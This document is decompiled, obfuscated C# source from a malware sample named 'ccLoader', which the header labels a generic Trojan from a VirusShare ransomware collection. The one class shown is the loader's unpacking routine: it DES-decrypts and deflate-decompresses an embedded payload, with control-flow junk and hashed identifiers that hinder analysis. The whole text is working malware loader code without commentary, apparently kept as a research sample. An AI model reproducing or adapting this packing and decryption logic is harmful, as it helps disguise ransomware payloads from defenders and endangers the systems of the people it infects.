// Decompiled with JetBrains decompiler
// Type: A.cc76fe69121e7ba87440855cfdbba8570
// Assembly: ccLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B8F8D12-A0D8-4328-BF2D-B6F5C3E92EBE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-5f7fd3e0efe1d0c0c6fde4333793f5dbb5d9c4d3ce88b846a8524a7eb833cd6d.exe

using System;
using System.Globalization;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Security.Cryptography;

namespace A
{
  internal sealed class cc76fe69121e7ba87440855cfdbba8570
  {
    private static MemoryStream c53d6c6db35f4003da271598a9c52decd;
    private static MemoryStream cd155c14a4880efabf2cefa271a6edbfb;
    private static object cee94fcff06d94686df3d505a10f6ea42;
    private static int cbb11ef17286f3c8f7398d92b6ad72a76 = int.MaxValue;
    private static int ca9f230f483795ee3e265fe5e67ca4612 = int.MinValue;

    static cc76fe69121e7ba87440855cfdbba8570()
    {
      cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd = (MemoryStream) null;
      cc76fe69121e7ba87440855cfdbba8570.cd155c14a4880efabf2cefa271a6edbfb = (MemoryStream) null;
      cc76fe69121e7ba87440855cfdbba8570.cee94fcff06d94686df3d505a10f6ea42 = c821d2d108e930c9cb380368c2064312a.caa95a27be9621ebad395c2b91f0bae34();
    }

    private static string c6a63085089082df6dbab277df2963e25(Assembly _param0)
    {
      string str = cb44b7552c301cc0a154ab6062c30dce5.c93db69146981f0807bf15e03112c27fd((object) _param0);
      int num = c7dd50c266f9a5650801268ccb1c77431.c93db69146981f0807bf15e03112c27fd((object) str, ',');
      if (num >= 0)
      {
label_1:
        switch (6)
        {
          case 0:
            goto label_1;
          default:
            if (false)
            {
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (cc76fe69121e7ba87440855cfdbba8570.c6a63085089082df6dbab277df2963e25);
            }
            str = c0be92b770f97f0f1de542cc3425897c5.c93db69146981f0807bf15e03112c27fd((object) str, 0, num);
            break;
        }
      }
      return str;
    }

    private static byte[] c648c8fa0b57b15e618e475b7ea910ca0(Assembly _param0)
    {
      try
      {
        string str = cb44b7552c301cc0a154ab6062c30dce5.c93db69146981f0807bf15e03112c27fd((object) _param0);
        int num1 = c2886ea941d1873fea6c3d5bec342e624.c93db69146981f0807bf15e03112c27fd((object) str, "PublicKeyToken=");
        if (num1 < 0)
        {
label_1:
          switch (6)
          {
            case 0:
              goto label_1;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (cc76fe69121e7ba87440855cfdbba8570.c648c8fa0b57b15e618e475b7ea910ca0);
              }
              num1 = c2886ea941d1873fea6c3d5bec342e624.c93db69146981f0807bf15e03112c27fd((object) str, "publickeytoken=");
              break;
          }
        }
        if (num1 < 0)
        {
label_6:
          switch (2)
          {
            case 0:
              goto label_6;
            default:
              return (byte[]) null;
          }
        }
        else
        {
          int num2 = num1 + 15;
          if (c79e9c63b4661a9a870d9e18dda324362.c93db69146981f0807bf15e03112c27fd((object) str, num2) != 'n')
          {
label_9:
            switch (3)
            {
              case 0:
                goto label_9;
              default:
                if (c79e9c63b4661a9a870d9e18dda324362.c93db69146981f0807bf15e03112c27fd((object) str, num2) == 'N')
                {
label_11:
                  switch (2)
                  {
                    case 0:
                      goto label_11;
                  }
                }
                else
                {
                  byte[] numArray = c751aeb6ca04e2ca8e79a722483e5efd8.caa95a27be9621ebad395c2b91f0bae34(c99a42a303410aeefd78c60c57c4f8fba.caa95a27be9621ebad395c2b91f0bae34(c0be92b770f97f0f1de542cc3425897c5.c93db69146981f0807bf15e03112c27fd((object) str, num2, 16), NumberStyles.HexNumber));
                  c7530c3fa83a063bd8ac68ccb1885636e.caa95a27be9621ebad395c2b91f0bae34((Array) numArray);
                  return numArray;
                }
                break;
            }
          }
          return (byte[]) null;
        }
      }
      catch
      {
      }
      return (byte[]) null;
    }

    internal static byte[] cdf6bba6a1040aa7c7ad4017f3c0b13de(Stream _param0)
    {
      object cee94fcff06d94686df3d505a10f6ea42;
      c7f24d88d88e290974f9ef725e5c33e50.caa95a27be9621ebad395c2b91f0bae34(cee94fcff06d94686df3d505a10f6ea42 = cc76fe69121e7ba87440855cfdbba8570.cee94fcff06d94686df3d505a10f6ea42);
      try
      {
        Stream stream = _param0;
        MemoryStream memoryStream = (MemoryStream) null;
        byte num1 = (byte) c028612baeffc02c10593926123864b54.c93db69146981f0807bf15e03112c27fd((object) _param0);
        if (((int) num1 & 1) != 0)
        {
label_2:
          switch (3)
          {
            case 0:
              goto label_2;
            default:
              if (false)
              {
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (cc76fe69121e7ba87440855cfdbba8570.cdf6bba6a1040aa7c7ad4017f3c0b13de);
              }
              DESCryptoServiceProvider cryptoServiceProvider = cf907a576c0d786f94435633c5ec683c0.caa95a27be9621ebad395c2b91f0bae34();
              byte[] numArray1 = new byte[8];
              c551cff3b49ef4c5aa9c40c5b3dd84d71.c93db69146981f0807bf15e03112c27fd((object) _param0, numArray1, 0, 8);
              c0b4fa98ecebc19508c49b25a52215004.c93db69146981f0807bf15e03112c27fd((object) cryptoServiceProvider, numArray1);
              byte[] numArray2 = new byte[8];
              c551cff3b49ef4c5aa9c40c5b3dd84d71.c93db69146981f0807bf15e03112c27fd((object) _param0, numArray2, 0, 8);
              bool flag = true;
              foreach (byte num2 in numArray2)
              {
                if (num2 != (byte) 0)
                {
label_7:
                  switch (7)
                  {
                    case 0:
                      goto label_7;
                    default:
                      flag = false;
                      goto label_12;
                  }
                }
              }
label_11:
              switch (4)
              {
                case 0:
                  goto label_11;
              }
label_12:
              if (flag)
              {
label_13:
                switch (2)
                {
                  case 0:
                    goto label_13;
                  default:
                    numArray2 = cc76fe69121e7ba87440855cfdbba8570.c648c8fa0b57b15e618e475b7ea910ca0(c6c5d3fd92a309a8dd3e55c519a362199.caa95a27be9621ebad395c2b91f0bae34());
                    break;
                }
              }
              c379b0daf7b623b880cca01018bba345e.c93db69146981f0807bf15e03112c27fd((object) cryptoServiceProvider, numArray2);
              if (cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd == null)
              {
label_16:
                switch (2)
                {
                  case 0:
                    goto label_16;
                  default:
                    if (cc76fe69121e7ba87440855cfdbba8570.cbb11ef17286f3c8f7398d92b6ad72a76 == int.MaxValue)
                    {
label_18:
                      switch (6)
                      {
                        case 0:
                          goto label_18;
                        default:
                          cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd = c1542a2a6e354139329922c92d652d027.caa95a27be9621ebad395c2b91f0bae34((int) ca4956430e8c10be455369979809e5738.c93db69146981f0807bf15e03112c27fd((object) _param0));
                          break;
                      }
                    }
                    else
                    {
                      cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd = c1542a2a6e354139329922c92d652d027.caa95a27be9621ebad395c2b91f0bae34(cc76fe69121e7ba87440855cfdbba8570.cbb11ef17286f3c8f7398d92b6ad72a76);
                      break;
                    }
                    break;
                }
              }
              c6cf7e8d7a4e22942caef5cbbc9d91b2c.c93db69146981f0807bf15e03112c27fd((object) cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd, 0L);
              ICryptoTransform cryptoTransform = c65b2b8d75d2c138c0a1f60360ffd97a5.c93db69146981f0807bf15e03112c27fd((object) cryptoServiceProvider);
              int num3 = c36959887439a8992f035a3b6751223a0.c93db69146981f0807bf15e03112c27fd((object) cryptoTransform);
              cd92892b68ebd804721bb40d9a52c5975.c93db69146981f0807bf15e03112c27fd((object) cryptoTransform);
              byte[] numArray3 = new byte[cd92892b68ebd804721bb40d9a52c5975.c93db69146981f0807bf15e03112c27fd((object) cryptoTransform)];
              byte[] numArray4 = new byte[c36959887439a8992f035a3b6751223a0.c93db69146981f0807bf15e03112c27fd((object) cryptoTransform)];
              int num4;
              for (num4 = (int) c2ec82fd4140424210126b580ef40ab2b.c93db69146981f0807bf15e03112c27fd((object) _param0); (long) (num4 + num3) < ca4956430e8c10be455369979809e5738.c93db69146981f0807bf15e03112c27fd((object) _param0); num4 += num3)
              {
                c551cff3b49ef4c5aa9c40c5b3dd84d71.c93db69146981f0807bf15e03112c27fd((object) _param0, numArray4, 0, num3);
                int num5 = c5e2d4608538be9ffb4de2e08716e8ac5.c93db69146981f0807bf15e03112c27fd((object) cryptoTransform, numArray4, 0, num3, numArray3, 0);
                cc1052536d3aa849432e24a677ca14938.c93db69146981f0807bf15e03112c27fd((object) cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd, numArray3, 0, num5);
              }
label_24:
              switch (2)
              {
                case 0:
                  goto label_24;
                default:
                  c551cff3b49ef4c5aa9c40c5b3dd84d71.c93db69146981f0807bf15e03112c27fd((object) _param0, numArray4, 0, (int) (ca4956430e8c10be455369979809e5738.c93db69146981f0807bf15e03112c27fd((object) _param0) - (long) num4));
                  byte[] numArray5 = c12e366893e61c33c7e7f390ff634eec4.c93db69146981f0807bf15e03112c27fd((object) cryptoTransform, numArray4, 0, (int) (ca4956430e8c10be455369979809e5738.c93db69146981f0807bf15e03112c27fd((object) _param0) - (long) num4));
                  cc1052536d3aa849432e24a677ca14938.c93db69146981f0807bf15e03112c27fd((object) cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd, numArray5, 0, numArray5.Length);
                  stream = (Stream) cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd;
                  c6cf7e8d7a4e22942caef5cbbc9d91b2c.c93db69146981f0807bf15e03112c27fd((object) stream, 0L);
                  memoryStream = cc76fe69121e7ba87440855cfdbba8570.c53d6c6db35f4003da271598a9c52decd;
                  break;
              }
              break;
          }
        }
        if (((int) num1 & 2) != 0)
        {
label_27:
          switch (2)
          {
            case 0:
              goto label_27;
            default:
              try
              {
                if (cc76fe69121e7ba87440855cfdbba8570.cd155c14a4880efabf2cefa271a6edbfb == null)
                {
label_29:
                  switch (3)
                  {
                    case 0:
                      goto label_29;
                    default:
                      if (cc76fe69121e7ba87440855cfdbba8570.ca9f230f483795ee3e265fe5e67ca4612 == int.MinValue)
                      {
label_31:
                        switch (3)
                        {
                          case 0:
                            goto label_31;
                          default:
                            cc76fe69121e7ba87440855cfdbba8570.cd155c14a4880efabf2cefa271a6edbfb = c1542a2a6e354139329922c92d652d027.caa95a27be9621ebad395c2b91f0bae34((int) ca4956430e8c10be455369979809e5738.c93db69146981f0807bf15e03112c27fd((object) stream) * 2);
                            break;
                        }
                      }
                      else
                      {
                        cc76fe69121e7ba87440855cfdbba8570.cd155c14a4880efabf2cefa271a6edbfb = c1542a2a6e354139329922c92d652d027.caa95a27be9621ebad395c2b91f0bae34(cc76fe69121e7ba87440855cfdbba8570.ca9f230f483795ee3e265fe5e67ca4612);
                        break;
                      }
                      break;
                  }
                }
                c6cf7e8d7a4e22942caef5cbbc9d91b2c.c93db69146981f0807bf15e03112c27fd((object) cc76fe69121e7ba87440855cfdbba8570.cd155c14a4880efabf2cefa271a6edbfb, 0L);
                DeflateStream deflateStream = c8f347c4f075e5a1e2af5988657137a58.caa95a27be9621ebad395c2b91f0bae34(stream, CompressionMode.Decompress);
                int length = 1000;
                byte[] numArray = new byte[length];
                int num6;
                do
                {
                  num6 = c551cff3b49ef4c5aa9c40c5b3dd84d71.c93db69146981f0807bf15e03112c27fd((object) deflateStream, numArray, 0, length);
                  if (num6 > 0)
                  {
label_36:
                    switch (3)
                    {
                      case 0:
                        goto label_36;
                      default:
                        cc1052536d3aa849432e24a677ca14938.c93db69146981f0807bf15e03112c27fd((object) cc76fe69121e7ba87440855cfdbba8570.cd155c14a4880efabf2cefa271a6edbfb, numArray, 0, num6);
                        break;
                    }
                  }
                }
                while (num6 >= length);
label_39:
                switch (6)
                {
                  case 0:
                    goto label_39;
                  default:
                    memoryStream = cc76fe69121e7ba87440855cfdbba8570.cd155c14a4880efabf2cefa271a6edbfb;
                    break;
                }
              }
              catch (Exception ex)
              {
                break;
              }
              break;
          }
        }
        if (memoryStream != null)
        {
label_43:
          switch (1)
          {
            case 0:
              goto label_43;
            default:
              return cd778a0374b526ac3ff7dcc28c395ce85.c93db69146981f0807bf15e03112c27fd((object) memoryStream);
          }
        }
        else
        {
          byte[] numArray = new byte[ca4956430e8c10be455369979809e5738.c93db69146981f0807bf15e03112c27fd((object) _param0) - c2ec82fd4140424210126b580ef40ab2b.c93db69146981f0807bf15e03112c27fd((object) _param0)];
          c551cff3b49ef4c5aa9c40c5b3dd84d71.c93db69146981f0807bf15e03112c27fd((object) _param0, numArray, 0, numArray.Length);
          return numArray;
        }
      }
      finally
      {
        cb59b215eee19c43e03e65f1b7f010115.caa95a27be9621ebad395c2b91f0bae34(cee94fcff06d94686df3d505a10f6ea42);
      }
    }
  }
}
